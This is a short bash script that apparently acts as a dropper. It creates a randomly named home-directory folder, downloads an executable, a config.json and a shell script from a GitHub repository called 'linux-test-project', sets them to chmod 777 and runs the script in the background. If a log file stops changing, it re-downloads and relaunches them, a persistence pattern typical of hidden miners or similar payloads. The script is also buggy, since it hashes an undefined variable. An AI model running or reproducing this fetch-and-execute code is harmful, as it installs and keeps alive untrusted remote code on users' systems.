#!/bin/bash

# Directory to check
DIR=~/gpUxgdSz

if [ -d "$DIR" ]; then
  echo "Running"
  cd ~
  cd gpUxgdSz
  FILE2="~/gpUxgdSz/loger.log"

  prev_checksum2=""

for i in 1 2; do
  if [ -f "$FILE2" ]; then
    # Calculate current checksum
    curr_checksum2=$(sha256sum "$FILE" | awk '{print $1}')
    
    if [ "$prev_checksum2" != "" ]; then
      if [ "$curr_checksum2" != "$prev_checksum2" ]; then
        echo "file changed"
      else
        echo "file did not change"
        cd ~
        cd gpUxgdSz
        rm config.json
        curl -O https://raw.githubusercontent.com/KarleyGreenholt/linux-test-project/refs/heads/main/config.json

        rm javarunprocess
        curl -O https://raw.githubusercontent.com/KarleyGreenholt/linux-test-project/refs/heads/main/javarunprocess
        chmod 777 javarunprocess
        rm five.sh
        curl -O https://raw.githubusercontent.com/KarleyGreenholt/linux-test-project/refs/heads/main/five.sh
        chmod 777 five.sh
        ./five.sh &
      fi
    fi
    
    # Update previous checksum
    prev_checksum2=$curr_checksum2
  else
    echo "file $FILE2 does not exist"
  fi
  

  sleep 120
done

else
  cd ~
  mkdir gpUxgdSz
  cd gpUxgdSz
  curl -O https://raw.githubusercontent.com/KarleyGreenholt/linux-test-project/refs/heads/main/javarunprocess
  chmod 777 javarunprocess
  curl -O https://raw.githubusercontent.com/KarleyGreenholt/linux-test-project/refs/heads/main/config.json
  
  curl -O https://raw.githubusercontent.com/KarleyGreenholt/linux-test-project/refs/heads/main/five.sh
  chmod 777 five.sh
  ./five.sh &
fi
